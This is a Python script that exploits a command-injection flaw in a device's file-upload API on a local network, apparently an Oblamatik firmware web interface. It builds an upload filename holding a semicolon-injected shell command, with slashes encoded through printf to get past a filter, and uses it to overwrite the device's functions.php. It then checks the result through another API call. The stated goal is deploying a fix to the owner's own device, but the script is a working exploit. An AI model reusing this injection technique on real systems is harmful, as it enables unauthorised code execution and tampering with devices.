import requests
import os
import sys

# Configuration
TARGET_IP = "192.168.1.173"
TARGET_URL = f"http://{TARGET_IP}/api/index.php?url=update-file-upload"
CHECK_URL = f"http://{TARGET_IP}/api/tlc/1"
FIX_FILE_PATH = "/Users/robertpsiurski/Documents/trae_projects/oblamatik/local_firmware_work/files_clean/www/inc/functions.php"

def deploy():
    print(f"[+] Reading fixed functions.php from {FIX_FILE_PATH}...")
    try:
        with open(FIX_FILE_PATH, 'rb') as f:
            file_content = f.read()
        print(f"[+] Read {len(file_content)} bytes.")
    except Exception as e:
        print(f"[-] Error reading file: {e}")
        return

    # Payload construction
    # We want to execute: cp *unique_id* /www/inc/functions.php
    # But we cannot use slashes in the filename.
    # So we generate slash using printf "\x2f".
    
    unique_id = "fix_deploy"
    
    # Shell command to execute:
    # S=$(printf "\x2f")
    # cp *fix_deploy* $S"www"$S"inc"$S"functions.php"
    
    # Note: We use *fix_deploy* to match the filename on disk which will be:
    # /tmp/fix_deploy;S=$(...);cp ...
    # Since the filename contains spaces and semicolons, matching by substring is easiest.
    
    cmd = (
        'S=$(printf "\\x2f");'
        f'cp *{unique_id}* $S"www"$S"inc"$S"functions.php"'
    )
    
    # Full filename injected
    filename = f"{unique_id};{cmd}"
    
    print(f"[+] Malicious filename: {filename}")
    
    files = {
        'file': (filename, file_content, 'application/octet-stream')
    }
    
    print(f"[+] Uploading to {TARGET_URL}")
    try:
        response = requests.post(TARGET_URL, files=files, timeout=10)
        print(f"[+] Upload status: {response.status_code}")
        print(f"[+] Response text: {response.text}")
    except Exception as e:
        print(f"[-] Upload failed: {e}")

    print("[+] Waiting for potential execution...")
    # No sleep needed really, cp is fast.
    
    print("[+] Verifying fix via API...")
    try:
        response = requests.get(CHECK_URL, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if isinstance(data, list) and len(data) > 0:
                data = data[0]
            
            ip = data.get('ip')
            print(f"[+] API Response IP: {ip}")
            
            # The fix should make get_local_ip() return the actual IP (e.g. 192.168.1.173)
            # instead of 1.1.1.1 (unless it is actually 1.1.1.1, which it isn't).
            if ip and ip != "1.1.1.1":
                print("[+] VERIFICATION SUCCESS: IP is correctly reported!")
            else:
                print("[-] VERIFICATION FAILED: IP is still 1.1.1.1.")
        else:
            print(f"[-] API check failed with status {response.status_code}")
    except Exception as e:
        print(f"[-] API check error: {e}")

if __name__ == "__main__":
    deploy()
